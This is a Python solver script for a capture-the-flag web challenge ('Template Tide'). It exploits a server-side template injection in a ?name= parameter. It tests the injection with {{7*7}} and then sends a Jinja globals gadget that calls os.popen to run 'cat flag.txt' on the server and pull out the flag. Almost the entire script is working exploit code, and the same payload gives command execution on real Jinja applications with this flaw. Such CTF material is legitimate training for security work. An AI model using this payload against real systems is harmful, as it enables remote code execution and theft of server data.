#!/usr/bin/env python3
"""
Template Tide solver. Exploits the SSTI in ?name= to read flag.txt.
Usage: python3 solve.py http://CHALLENGE_HOST:5000
"""
import sys, re, urllib.parse, urllib.request

base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"


def get(payload):
    u = base + "/?name=" + urllib.parse.quote(payload)
    return urllib.request.urlopen(u, timeout=5).read().decode(errors="replace")


# 1) confirm injection
assert "49" in get("{{7*7}}"), "no SSTI here"

# 2) read the flag via a globals gadget
payload = '{{ cycler.__init__.__globals__.os.popen("cat flag.txt").read() }}'
m = re.search(r"rstcon\{[^}]*\}", get(payload))
print(m.group(0) if m else "flag not found")
